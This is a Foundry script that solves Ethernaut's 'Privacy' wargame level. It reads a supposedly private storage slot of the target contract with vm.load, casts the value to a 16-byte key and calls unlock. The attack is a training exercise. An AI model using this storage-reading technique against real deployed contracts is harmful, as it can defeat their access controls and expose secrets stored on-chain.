// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IPrivacy } from "ethernaut/12-privacy/IPrivacy.sol";

contract PrivacyScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address privacyAddr = vm.envAddress("L12_PRIVACY_ADDRESS");
        IPrivacy privacy = IPrivacy(privacyAddr);

        // Step 1: read slot 5 (data[2])
        bytes32 slot5 = vm.load(privacyAddr, bytes32(uint256(5)));
        console.logBytes32(slot5);

        // Step 2: cast it & unlock
        privacy.unlock(bytes16(slot5));
        console.logBool(privacy.locked());

        vm.stopBroadcast();
    }
}
